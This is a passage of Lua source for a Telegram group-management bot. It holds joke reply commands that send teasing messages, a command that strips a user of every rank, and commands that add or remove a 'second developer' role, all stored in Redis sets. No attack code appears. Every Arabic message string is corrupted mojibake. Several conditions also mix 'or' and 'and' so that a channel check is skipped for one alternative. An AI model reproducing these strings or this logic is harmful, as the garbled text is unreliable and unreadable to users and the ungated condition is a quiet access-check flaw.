local mustafaTEAM = {"ΩΩΩ Ψ¬Ψ±Ψ¬Ω Ψ§Ψ­ΨͺΨ±Ω Ψ§Ψ³ΩΨ§Ψ―ΩΩ ΩΨ§ Ψ§ΩΨͺΩΩΩ ΩΨ§Ψ²Ψ±Ψ¨Ψ¨ ΨΉΩΩ ΩΨ¨Ψ±ΩΩΨπ©ππΏ","ΩΨ΄Ψ΄ ΩΨ§Ψ΄Ω ΩΨͺΨΆΩ ΨͺΩΨ³ΩΨͺ ΩΨ§ Ψ§Ψ?Ψ±Ψ¨Ψ· ΨͺΨΆΨ§Ψ±ΩΨ³ ΩΨ¬ΩΩ Ψ¬ΩΩ Ψ§Ψ¨Ψ· ΨΉΨ¨Ψ―ΩΨ πππΏ","Ψ―ΩΨ΄Ω ΩΩ ΩΩΨ¨ΩΨΉ Ψ§ΩΩΨ΄Ω ΩΩ Ψ²ΩΩ ΩΩΩΩΩΩ°Ω ΩΩΨ­Ψ¬Ω ΩΩΨ§Ω ΩΩ ΩΩΨ¨ΩΨ° πππΏ","ΩΨ§ Ψ§ΩΨΊΩΩΨΆ Ψ§ΩΨͺΩΨ³ Ψ§Ψ¨Ω Ψ±Ψ§Ψ³ Ψ§ΩΩΨ±Ψ¨ΨΉ ΩΨͺΨΉΩΩΩΩ Ψ¬Ω Ψ­Ψ¬Ψ§ΩΩ ΩΨ¬Ψ§Ω ΨͺΨ·ΩΨ·ΩΩΩ ΨΉΩΩΩΩ Ψ―Ψ¨Ψ·Ωππͺ","Ψ­Ψ¨ΩΨ¨Ω Ψ±Ψ§Ψ­ Ψ§Ψ­Ψ§ΩΩ Ψ§Ψ­ΨͺΨ±ΩΩΩ ΩΨ§ΩΩΨ±Ω Ψ¨ΩΩΩ ΨͺΨ¨Ψ·Ω Ψ­ΩΩΩΩΨ π€πͺ"} 
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("Ψ¨ΩΨ³Ω") or text == ("Ψ¨ΨΉΨ― Ψ¨ΩΨ³Ω") or text == ("ΨΆΩ Ψ¨ΩΨ³") or text == ("Ψ¨ΩΨ³Ω Ψ¨ΨΉΨ―") or text == ("Ψ¨ΩΨ³ΩΨ§") or text == ("Ψ¨ΨΉΨ― Ψ¨ΩΨ³ΩΨ§") or text == ("ΨΆΩ Ψ¨ΩΨ³") or text == ("Ψ¨ΩΨ³ΩΨ§ Ψ¨ΨΉΨ―") or text == ("Ψ¨ΩΨ³ΩΩ") then
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ΩΩΩΩΩΩ Ψ΄ΩΩΩΩ Ψ±Ψ§Ψ­Ψ­ Ψ§Ψ¨ΩΨ³ ΩΩΨ³ΩΩΨπΆπ', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_mfm(msg.chat_id_, result.id_, 1, 'ΩΩΨ§Ψ­Ψ­Ψ­ Ψ§Ψ­ΩΨ§Ψ§ Ψ¨ΩΨ³Ψ©Ψ© Ψ§ΩΩΨ·ΩΨ±ΩΩπ»π₯π', 1, 'html')
return false
end 
local mustafaTEAM = "Ψ΅Ψ§Ψ±Ψ± Ψ³ΨͺΨ§Ψ°ΩΩ ππ»ββοΈβ₯οΈ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = {"ΩΩΨ§Ψ­Ψ­Ψ­ Ψ§ΩΩΩΩ°Ψ΄ ΨΉΨ§ΩΩΩΩ°ΩΩΩππ₯π","Ψ§ΩΩΩΩΩΨ§Ψ§ΩΨ­Ψ­ Ψ΄ΩΩΨΉΨ³Ωπ₯Ίπ―π","ΩΩΨ§Ψ­Ψ­Ψ­ΨΨ‘ΩΩΩ Ψ§Ψ°ΩΨ¨π€€π"} 
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("Ψ΅ΩΨ­Ω") or text == ("Ψ΅ΩΨ­ΩΨ§") or text == ("Ψ΅ΩΨ­ΩΩ") or text == ("Ψ΅ΩΨ­") then
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ΩΩΩΩΩΩ Ψ΄ΩΩΩΩ Ψ±Ψ§Ψ­Ψ­ Ψ§Ψ΅ΩΨ­ ΩΩΨ³ΩΩΨπΆπ', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_mfm(msg.chat_id_, result.id_, 1, 'ΨͺΨΉΨ§Ω ΩΨ·ΩΨ±ΩΩ ΩΨ­ΨͺΨ§Ψ¬ΩΩΩππ»ββοΈβ₯οΈ', 1, 'html')
return false
end 
local mustafaTEAM = "Ψ΅Ψ§Ψ±Ψ± Ψ³ΨͺΨ§Ψ°ΩΩ ππ»ββοΈβ₯οΈ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = {"ΨͺΨͺΨΉΨ§Ω Ψ­Ψ­Ψ¨ ΩΨ­ΨͺΨ§Ψ¬ΩΩππ­","ΨͺΨΉΨ§Ω ΩΩΩΩ Ψ§Ψ³ΨͺΨ§Ψ°ΩΩ Ψ§ΩΨ±ΩΨ―ΩΩΩππͺ","ΩΩΨΉΩΩΨ― ΨͺΨΉΨ§Ψ§Ω ΩΨ±ΩΨ―ΩΩΩπ€β₯οΈ","ΨͺΨΉΨ§Ω ΩΩΩ Ψ―ΩΨ΅ΩΨ­ΩΩππ€"} 
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     Source Escobar     --
if text and text:match('^Ψ΅ΩΨ­Ω @(.*)') and ChCheck(msg) or text and text:match('^Ψ΅ΩΨ­ @(.*)') and ChCheck(msg) then 
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^Ψ΅ΩΨ­Ω @(.*)') or text:match('^Ψ΅ΩΨ­ @(.*)') 
function mustafaTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ΩΩΩΩΩΩ Ψ΄ΩΩΩΩ Ψ±Ψ§Ψ­Ψ­ Ψ§Ψ΅ΩΨ­ ΩΩΨ³ΩΩΨπΆπ', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ΨͺΨΉΨ§Ω ΩΨ·ΩΨ±ΩΩ ΩΨ­ΨͺΨ§Ψ¬ΩΩΩππ»ββοΈβ₯οΈ @'..username, 1, 'html') 
return false  
end  
local mustafaTEAM = "Ψ΅Ψ§Ψ±Ψ± Ψ³ΨͺΨ§Ψ°ΩΩ ππ»ββοΈβ₯οΈ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = { "ΨͺΨͺΨΉΨ§Ω Ψ­Ψ­Ψ¨ @"..username.." ΩΨ­ΨͺΨ§Ψ¬ΩΩππ­","ΨͺΨΉΨ§Ω ΩΩΩΩ @"..username.." Ψ§Ψ³ΨͺΨ§Ψ°ΩΩ Ψ§ΩΨ±ΩΨ―ΩΩΩππͺ","ΩΩΨΉΩΩΨ― @"..username.." ΨͺΨΉΨ§Ψ§Ω ΩΨ±ΩΨ―ΩΩΩπ€β₯οΈ","ΨͺΨΉΨ§Ω ΩΩΩ @"..username.." Ψ―ΩΨ΅ΩΨ­ΩΩππ€",}
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'html') 
else  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ ΨΊΩΨ± ΩΩΨ¬ΩΨ― ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md') 
end 
end 
resolve_username(username,mustafaTEAM)
end
end
end
--     Source Escobar     --
if text == ("ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.sender_user_id_) then
secondsudo = 'Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ β’ ' else secondsudo = '' end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',result.sender_user_id_) then
sudobot = 'Ψ§ΩΩΨ·ΩΨ±ΩΩ β’ ' else sudobot = '' end
if Devmfm:sismember(mustafa..'mfm:ManagerAll:',result.sender_user_id_) then
managerall = 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§ΩΩΩ β’ ' else managerall = '' end
if Devmfm:sismember(mustafa..'mfm:AdminAll:',result.sender_user_id_) then
adminall = 'Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§ΩΩΩ β’ ' else adminall = '' end
if Devmfm:sismember(mustafa..'mfm:VipAll:',result.sender_user_id_) then
vpall = 'Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§ΩΩΩ β’ ' else vpall = '' end
if Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ β’ ' else basicconstructor = '' end
if Devmfm:sismember(mustafa..'mfm:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ β’ ' else constructor = '' end 
if Devmfm:sismember(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ β’ ' else manager = '' end
if Devmfm:sismember(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'Ψ§ΩΨ§Ψ―ΩΩΩΩ β’ ' else admins = '' end
if Devmfm:sismember(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'Ψ§ΩΩΩΩΨ²ΩΩ β’ ' else vipmem = '' end
if Devmfm:sismember(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'Ψ§ΩΩΩΨΈΩΩΩΩ°Ω β’ ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ β β₯‘\n~ ( "..secondsudo..''..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","β β« ΩΩ ΨͺΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ³Ψ¨ΩΨ§")  
end
if mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
Devmfm:srem(mustafa..'mfm:SecondSudo:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:SudoBot:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
Devmfm:srem(mustafa..'mfm:SudoBot:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'mfmconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.id_) then
secondsudo = 'Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ β’ ' else secondsudo = '' end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',result.id_) then
sudobot = 'Ψ§ΩΩΨ·ΩΨ±ΩΩ β’ ' else sudobot = '' end
if Devmfm:sismember(mustafa..'mfm:ManagerAll:',result.id_) then
managerall = 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§ΩΩΩ β’ ' else managerall = '' end
if Devmfm:sismember(mustafa..'mfm:AdminAll:',result.id_) then
adminall = 'Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§ΩΩΩ β’ ' else adminall = '' end
if Devmfm:sismember(mustafa..'mfm:VipAll:',result.id_) then
vpall = 'Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§ΩΩΩ β’ ' else vpall = '' end
if Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ β’ ' else basicconstructor = '' end
if Devmfm:sismember(mustafa..'mfm:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ β’ ' else constructor = '' end 
if Devmfm:sismember(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_) then
manager = 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ β’ ' else manager = '' end
if Devmfm:sismember(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_) then
admins = 'Ψ§ΩΨ§Ψ―ΩΩΩΩ β’ ' else admins = '' end
if Devmfm:sismember(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'Ψ§ΩΩΩΩΨ²ΩΩ β’ ' else vipmem = '' end
if Devmfm:sismember(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'Ψ§ΩΩΩΨΈΩΩΩΩ°Ω β’ ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ β β₯‘\n~ ( "..secondsudo..''..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","β β« ΩΩ ΨͺΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ³Ψ¨ΩΨ§")  
end 
if mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
Devmfm:srem(mustafa..'mfm:SecondSudo:', result.id_)
Devmfm:srem(mustafa..'mfm:SudoBot:', result.id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
Devmfm:srem(mustafa..'mfm:SudoBot:', result.id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'mfmconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
elseif mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source Escobar     --
--     Set SecondSudo     --
if Sudo(msg) then
if text ==('Ψ§ΨΆΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ') or text ==('Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ') and ChCheck(msg) then
function sudo_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ Ψ§έͺΨ«ΩΨ£ΩΩΩ°ΩΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^Ψ§ΨΆΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)') or text:match('^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ§ΨΆΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)') or text:match('^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ Ψ§έͺΨ«ΩΨ£ΩΩΩ°ΩΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^Ψ§ΨΆΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)') or text:match('^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ§ΨΆΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)') or text:match('Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)')
Devmfm:sadd(mustafa..'mfm:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ Ψ§έͺΨ«ΩΨ£ΩΩΩ°ΩΩΩ*")  
end
--     Source Escobar     --
--     Rem SecondSudo     --
if text ==('Ψ­Ψ°Ω ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ') or text ==('ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ Ψ§έͺΨ«ΩΨ£ΩΩΩ°ΩΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^Ψ­Ψ°Ω ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)') or text:match('^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ­Ψ°Ω ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)') or text:match('^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§έͺΨ«ΩΨ£ΩΩΩ°ΩΩΩ*")  
else 
